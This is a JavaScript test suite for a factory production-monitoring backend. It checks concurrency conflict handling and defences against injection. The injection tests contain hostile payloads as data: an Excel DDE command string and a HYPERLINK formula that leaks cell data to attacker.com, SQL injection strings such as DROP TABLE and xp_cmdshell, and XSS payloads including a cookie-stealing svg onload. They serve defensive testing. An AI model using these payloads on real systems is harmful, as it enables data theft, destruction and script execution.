const assert = require('node:assert/strict')
const { randomUUID } = require('node:crypto')
const fs = require('node:fs')
const path = require('node:path')
const test = require('node:test')
const ExcelJS = require('exceljs')
const PDFDocument = require('pdfkit')
const jwt = require('jsonwebtoken')

const {
  loadAppWithMocks,
  requestJson,
  withTestServer,
  assertError,
} = require('./helpers/appTestUtils')
const {
  toXlsx,
} = require('../src/modules/reports/reportsXlsx.serializer')
const {
  toPdf,
} = require('../src/modules/reports/reportsExport.serializer')
const {
  OUTPUT_SENSOR_CODE,
  PROCESS_SENSOR_CODES,
  getSensorLabel,
} = require('../src/shared/sensorIdentity')

const databaseRoot = path.resolve(__dirname, '../database')
const JWT_SECRET = process.env.JWT_SECRET || 'test-jwt-secret-for-backend-suite'
const userId = '22222222-2222-4222-8222-222222222222'

function createToken(role = 'Admin') {
  return jwt.sign(
    {
      username: role.toLowerCase().replaceAll(' ', ''),
      role,
    },
    JWT_SECRET,
    { subject: userId, expiresIn: '1h' },
  )
}

function authHeader(role = 'Admin') {
  return {
    Authorization: `Bearer ${createToken(role)}`,
  }
}

async function setupDatabase(t) {
  const migrations = fs.readdirSync(path.join(databaseRoot, 'migrations'))
    .filter((name) => {
      const match = /^(\d{3})_.*\.sql$/.exec(name)
      return match && Number(match[1]) >= 29 && Number(match[1]) <= 51
    })
    .sort()
    .map((name) => fs.readFileSync(path.join(databaseRoot, 'migrations', name), 'utf8'))

  const [{ PGlite }, { pgcrypto }] = await Promise.all([
    import('@electric-sql/pglite'),
    import('@electric-sql/pglite/contrib/pgcrypto'),
  ])

  const db = await PGlite.create({ extensions: { pgcrypto } })
  t.after(() => db.close())

  await db.exec('create role anon; create role authenticated; create role service_role bypassrls;')
  await db.exec(fs.readFileSync(path.join(databaseRoot, 'schema.sql'), 'utf8'))
  await db.exec(fs.readFileSync(path.join(databaseRoot, 'seed.sql'), 'utf8'))
  await db.query(`insert into users(name, username, password_hash, must_change_password, role_id)
    select 'Challenger 2 Admin', 'challenger2-admin', 'hash', false, id from roles where name = 'Admin'`)

  for (const migration of migrations) {
    await db.exec(migration)
  }

  return db
}

async function getAdminUser(db) {
  const result = await db.query(`select id from users where username = 'challenger2-admin'`)
  return result.rows[0].id
}

async function getSensors(db) {
  const result = await db.query(`select id, sensor_code, machine_id from sensors`)
  const map = {}
  for (const row of result.rows) {
    map[row.sensor_code] = row
  }
  return map
}

async function insertSensorEvent(db, {
  sensorId,
  machineId,
  eventType = 'pulse',
  outputAccepted = true,
  rejectionReason = null,
  recordedAt = '2026-06-01T08:00:00Z',
}) {
  const id = randomUUID()
  await db.query(`
    insert into sensor_events (id, sensor_id, machine_id, device_event_id, event_type, event_value, recorded_at, output_accepted, output_rejection_reason)
    values ($1, $2, $3, $4, $5, '{}'::jsonb, $6, $7, $8)
  `, [id, sensorId, machineId, randomUUID(), eventType, recordedAt, outputAccepted, rejectionReason])
  return id
}

test('SUITE 1: Concurrency & Optimistic Conflict Handling (PostgreSQL RPC & API 409)', async (t) => {
  const db = await setupDatabase(t)
  const sensors = await getSensors(db)
  const adminId = await getAdminUser(db)
  const s05 = sensors['S-05']

  const eventId = await insertSensorEvent(db, {
    sensorId: s05.id,
    machineId: s05.machine_id,
    recordedAt: '2026-06-01T08:00:00Z',
    outputAccepted: true,
  })

  await db.exec('set role service_role;')

  // Initial update: create specification row
  const initialUpdate = await db.query(
    `select * from public.update_production_log_spec($1, $2, $3, $4, $5, $6, $7, $8)`,
    [eventId, 'Initial Client', 625.4, 12.7, 6000.0, 101, adminId, null],
  )
  assert.equal(initialUpdate.rows.length, 1)
  const initialUpdatedAt = initialUpdate.rows[0].updated_at
  assert.ok(initialUpdatedAt, 'Row must have updated_at timestamp')

  // User 1 updates successfully with matching expected_updated_at
  const user1Update = await db.query(
    `select * from public.update_production_log_spec($1, $2, $3, $4, $5, $6, $7, $8)`,
    [eventId, 'User 1 Client', 625.4, 12.7, 6000.0, 101, adminId, initialUpdatedAt],
  )
  assert.equal(user1Update.rows[0].customer, 'User 1 Client')
  const user1UpdatedAt = user1Update.rows[0].updated_at
  assert.notEqual(user1UpdatedAt, initialUpdatedAt, 'updated_at must change on modification')

  // User 2 attempts concurrent update with STALE initialUpdatedAt -> MUST reject with SQLSTATE 40001
  await assert.rejects(
    db.query(
      `select * from public.update_production_log_spec($1, $2, $3, $4, $5, $6, $7, $8)`,
      [eventId, 'User 2 Client (Stale)', 1020.0, 10.0, 12000.0, 102, adminId, initialUpdatedAt],
    ),
    (err) => {
      assert.equal(err.code, '40001')
      assert.match(err.message, /modified by another user/i)
      return true
    },
    'Stale expected_updated_at must throw SQLSTATE 40001 conflict',
  )

  // User 2 refreshes and retries with fresh user1UpdatedAt -> MUST succeed
  const user2FreshUpdate = await db.query(
    `select * from public.update_production_log_spec($1, $2, $3, $4, $5, $6, $7, $8)`,
    [eventId, 'User 2 Client (Fresh)', 1020.0, 10.0, 12000.0, 102, adminId, user1UpdatedAt],
  )
  assert.equal(user2FreshUpdate.rows[0].customer, 'User 2 Client (Fresh)')
  assert.equal(Number(user2FreshUpdate.rows[0].diameter), 1020)
})

test('SUITE 1b: API Level HTTP 409 Conflict propagation on stale expectedUpdatedAt', async () => {
  const staleEventId = 'e0000000-0000-4000-8000-000000000099'
  const mockRepo = {
    findOutputSensor: async () => ({
      id: '33333333-3333-4333-8333-555555555555',
      sensor_code: 'S-05',
      label: 'Production Output Cutting',
      machine_id: '22222222-2222-4222-8222-222222222222',
      machines: { id: '22222222-2222-4222-8222-222222222222', machine_code: 'M-01', name: 'Spiral Mill 01' },
    }),
    findProductionEvents: async () => [],
    findProductionSpecs: async () => new Map(),
    updateProductionSpec: async ({ expectedUpdatedAt }) => {
      // Simulate database throwing 40001 mapped to status 409
      if (expectedUpdatedAt === '2026-06-01T08:00:00.000Z') {
        const conflictErr = new Error('Production specification was modified by another user.')
        conflictErr.status = 409
        conflictErr.code = 'PRODUCTION_SPEC_CONFLICT'
        throw conflictErr
      }
      return {
        sensor_event_id: staleEventId,
        customer: 'Fresh Customer',
        diameter: '625.40',
        thickness: '12.70',
        length: '6000.00',
        pipe_number: 101,
        updated_at: '2026-06-01T09:00:00.000Z',
      }
    },
  }

  const app = loadAppWithMocks({
    'src/modules/production/production.repository.js': mockRepo,
  })

  await withTestServer(app, async (baseUrl) => {
    // 1. Stale expectedUpdatedAt -> Returns HTTP 409
    const resStale = await requestJson(baseUrl, `/api/production/${staleEventId}`, {
      method: 'PATCH',
      headers: authHeader('Admin'),
      body: {
        customer: 'Competing Update',
        expectedUpdatedAt: '2026-06-01T08:00:00.000Z',
      },
    })

    assert.equal(resStale.response.status, 409, 'Must return HTTP 409 Conflict')
    assert.equal(resStale.body.error.code, 'PRODUCTION_SPEC_CONFLICT')
    assert.match(resStale.body.error.message, /modified by another user/i)

    // 2. Fresh expectedUpdatedAt -> Returns HTTP 200
    const resFresh = await requestJson(baseUrl, `/api/production/${staleEventId}`, {
      method: 'PATCH',
      headers: authHeader('Admin'),
      body: {
        customer: 'Fresh Update',
        expectedUpdatedAt: '2026-06-01T08:30:00.000Z',
      },
    })

    assert.equal(resFresh.response.status, 200, 'Must return HTTP 200 OK')
    assert.equal(resFresh.body.spec.customer, 'Fresh Customer')
  })
})

test('SUITE 2: Injection Defenses — Excel Formula Injection Escaping (=, +, -, @)', async () => {
  const maliciousCustomers = [
    '=CMD|\' /C calc\'!A0',
    '+1+2+cmd|',
    '-5+10',
    '@SUM(A1:A10)',
    '=HYPERLINK("http://attacker.com/leak?data="&A1,"Click Here")',
    '-2+3*[1]Sheet1!$A$1',
  ]

  const reportWithInjections = {
    category: 'production',
    selectedDate: '2026-10-31',
    reportType: 'daily',
    machine: { name: 'Spiral Mill 01', code: 'M-01' },
    summary: [
      { id: 'totalProductionOutput', label: 'Total Cuts', value: maliciousCustomers.length },
    ],
    specBreakdown: maliciousCustomers.map((maliciousCust, idx) => ({
      customer: maliciousCust,
      diameter: 625.4,
      thickness: 12.7,
      length: 6000,
      pipeCount: 1,
      totalTonnage: 1.1513,
      percentageOfTotal: 100 / maliciousCustomers.length,
    })),
    productionLogs: maliciousCustomers.map((maliciousCust, idx) => ({
      id: `cut-${idx + 1}`,
      deviceEventId: 100 + idx,
      customer: maliciousCust,
      diameter: 625.4,
      thickness: 12.7,
      length: 6000,
      pipeNumber: idx + 1,
      tonnage: 1.1513,
      isSpecified: true,
      recordedAt: '2026-10-31T08:00:00Z',
    })),
  }

  const xlsxBuffer = await toXlsx(reportWithInjections)
  assert.ok(Buffer.isBuffer(xlsxBuffer))
  const workbook = new ExcelJS.Workbook()
  await workbook.xlsx.load(xlsxBuffer)

  // 1. Check Worksheet 1: Production Summary breakdown
  const summarySheet = workbook.getWorksheet('Production Summary')
  assert.ok(summarySheet, 'Production Summary worksheet must exist')

  maliciousCustomers.forEach((payload, idx) => {
    const row = summarySheet.getRow(13 + idx)
    const customerCellValue = row.getCell(1).value
    assert.ok(
      typeof customerCellValue === 'string',
      `Cell value must be string for customer payload "${payload}"`,
    )
    assert.ok(
      customerCellValue.startsWith("'"),
      `Cell value "${customerCellValue}" must start with single quote to neutralize formula injection for "${payload}"`,
    )
    assert.equal(
      customerCellValue,
      `'${payload}`,
      `Payload must be escaped by prefixing single quote: "'${payload}"`,
    )
  })

  // 2. Check Worksheet 2: Production Logs cut items
  const logsSheet = workbook.getWorksheet('Production Cut Logs')
  assert.ok(logsSheet, 'Production Cut Logs worksheet must exist')

  maliciousCustomers.forEach((payload, idx) => {
    const row = logsSheet.getRow(6 + idx)
    const customerCellValue = row.getCell(2).value
    assert.ok(
      typeof customerCellValue === 'string',
      `Logs sheet cell value must be string for customer payload "${payload}"`,
    )
    assert.ok(
      customerCellValue.startsWith("'"),
      `Logs sheet cell value "${customerCellValue}" must start with single quote for "${payload}"`,
    )
    assert.equal(customerCellValue, `'${payload}`)
  })

  // 3. Ensure benign customer strings without formula triggers are NOT unnecessarily prefixed
  const benignReport = {
    category: 'production',
    selectedDate: '2026-10-31',
    summary: [],
    specBreakdown: [{ customer: 'Petro Hydro Pipes Corp', diameter: 625.4, thickness: 12.7, length: 6000, pipeCount: 1 }],
    productionLogs: [{ customer: 'Petro Hydro Pipes Corp', diameter: 625.4, thickness: 12.7, length: 6000, pipeNumber: 1, isSpecified: true }],
  }
  const benignBuffer = await toXlsx(benignReport)
  const benignWorkbook = new ExcelJS.Workbook()
  await benignWorkbook.xlsx.load(benignBuffer)
  const benignSummaryCell = benignWorkbook.getWorksheet('Production Summary').getRow(13).getCell(1).value
  assert.equal(benignSummaryCell, 'Petro Hydro Pipes Corp', 'Benign customer should not have prepended quote')
})

test('SUITE 2b: SQL Injection Resistance in Production & Reports Endpoints', async () => {
  const sqlInjectionPayloads = [
    "'; DROP TABLE production_item_specs; --",
    "1' OR '1'='1",
    "admin' --",
    "1 UNION SELECT null, null, null, null, null --",
    "'; EXEC xp_cmdshell('dir'); --",
  ]

  const app = loadAppWithMocks({
    'src/modules/production/production.repository.js': {
      findOutputSensor: async () => ({
        id: '33333333-3333-4333-8333-555555555555',
        sensor_code: 'S-05',
        label: 'Production Output Cutting',
        machine_id: '22222222-2222-4222-8222-222222222222',
        machines: { id: '22222222-2222-4222-8222-222222222222', machine_code: 'M-01', name: 'Spiral Mill 01' },
      }),
      findProductionEvents: async () => [],
      findProductionSpecs: async () => new Map(),
      findProductionSpecsByEventIds: async () => new Map(),
      updateProductionSpec: async (params) => {
        // Assert that customer is passed purely as data, not concatenated
        return {
          sensor_event_id: params.eventId,
          customer: params.customer,
          diameter: '625.40',
          thickness: '12.70',
          length: '6000.00',
          pipe_number: 1,
          updated_at: new Date().toISOString(),
        }
      },
      batchUpdateProductionSpecs: async () => ({ matched_count: 0, updated_count: 0, sensor_event_ids: [] }),
    },
  })

  await withTestServer(app, async (baseUrl) => {
    for (const sqlPayload of sqlInjectionPayloads) {
      // 1. Search filter with SQL injection payload
      const searchRes = await requestJson(baseUrl, `/api/production?date=2026-03-15&search=${encodeURIComponent(sqlPayload)}`, {
        headers: authHeader('Admin'),
      })
      // Must either return 200 with empty/filtered list or 400 if length exceeds schema, never 500
      assert.ok([200, 400].includes(searchRes.response.status))
      if (searchRes.response.status === 200) {
        assert.ok(Array.isArray(searchRes.body.records))
      }

      // 2. Single edit customer with SQL injection payload (length <= 100)
      if (sqlPayload.length <= 100) {
        const patchRes = await requestJson(baseUrl, '/api/production/e0000000-0000-4000-8000-000000000001', {
          method: 'PATCH',
          headers: authHeader('Admin'),
          body: {
            customer: sqlPayload,
          },
        })
        assert.equal(patchRes.response.status, 200)
        assert.equal(patchRes.body.spec.customer, sqlPayload, 'SQL payload treated strictly as literal string')
      }
    }
  })
})

test('SUITE 2c: XSS Prevention in PDF Serializer', async () => {
  const zlib = require('node:zlib')
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(document.cookie)>',
    '<iframe src="javascript:alert(1)"></iframe>',
  ]

  const reportWithXss = {
    category: 'production',
    selectedDate: '2026-10-31',
    reportType: 'daily',
    machine: { name: 'Spiral Mill 01', code: 'M-01' },
    summary: [
      { id: 'totalProductionOutput', label: '<script>alert(1)</script>', value: '5 pcs', helper: '<b>bold</b>' },
    ],
    specBreakdown: xssPayloads.map((payload) => ({
      customer: payload,
      diameter: 625.4,
      thickness: 12.7,
      length: 6000,
      pipeCount: 1,
      totalTonnage: 1.1513,
      percentageOfTotal: 25.0,
    })),
    productionLogs: xssPayloads.map((payload, i) => ({
      id: `cut-xss-${i}`,
      deviceEventId: i,
      customer: payload,
      diameter: 625.4,
      thickness: 12.7,
      length: 6000,
      pipeNumber: i + 1,
      tonnage: 1.1513,
      isSpecified: true,
      recordedAt: '2026-10-31T08:00:00Z',
    })),
  }

  // Render PDF buffer and verify no crash, clean binary output with PDF header
  const pdfBuffer = await toPdf(reportWithXss)
  assert.ok(Buffer.isBuffer(pdfBuffer), 'Must return a Buffer')
  assert.ok(pdfBuffer.length > 1000, 'PDF buffer must have valid size')
  assert.equal(pdfBuffer.subarray(0, 5).toString('ascii'), '%PDF-', 'Must start with PDF signature')

  // Decompress streams to verify that malicious strings are encoded as hexadecimal character codes
  let allDecoded = ''
  const lenRegex = /\/Length\s+(\d+)[\s\S]*?stream\n/g
  const binaryString = pdfBuffer.toString('latin1')
  let match
  while ((match = lenRegex.exec(binaryString)) !== null) {
    const len = parseInt(match[1], 10)
    const start = match.index + match[0].length
    const streamSlice = pdfBuffer.subarray(start, start + len)
    try {
      const decompressed = zlib.inflateSync(streamSlice).toString('latin1')
      const tjRegex = /\[(.*?)\]\s*TJ/g
      let tjMatch
      while ((tjMatch = tjRegex.exec(decompressed)) !== null) {
        const hexParts = [...tjMatch[1].matchAll(/<([0-9a-fA-F]+)>/g)].map((m) => m[1])
        const textChunk = hexParts.map((h) => Buffer.from(h, 'hex').toString('latin1')).join('')
        allDecoded += textChunk + ' '
      }
    } catch {
      // Non-flate or image streams
    }
  }

  assert.ok(
    allDecoded.includes('alert') && allDecoded.includes('script'),
    'PDF text stream contains literal strings safely hex-encoded via vector operators',
  )
})

test('SUITE 3: Hard Guardrails — Sensor Identity Single Source of Truth', () => {
  // 1. Backend sensorIdentity exports OUTPUT_SENSOR_CODE and PROCESS_SENSOR_CODES
  assert.equal(OUTPUT_SENSOR_CODE, 'S-05')
  assert.ok(Array.isArray(PROCESS_SENSOR_CODES))
  assert.ok(PROCESS_SENSOR_CODES.includes('S-01'))
  assert.ok(PROCESS_SENSOR_CODES.includes('S-02'))
  assert.ok(PROCESS_SENSOR_CODES.includes('S-04'))
  assert.ok(!PROCESS_SENSOR_CODES.includes('S-05'), 'S-05 is output cutting, not process sensor')
  assert.ok(!PROCESS_SENSOR_CODES.includes('S-03'), 'S-03 is excluded/inactive')

  // 2. getSensorLabel returns proper station label
  assert.equal(getSensorLabel('S-05'), 'Production Output Cutting')
  assert.equal(getSensorLabel('S-01'), 'Raw Material & Coil Joint')
  assert.equal(getSensorLabel('S-02'), 'Inside Filler Wire')
  assert.equal(getSensorLabel('S-04'), 'Outside Filler Wire')
})
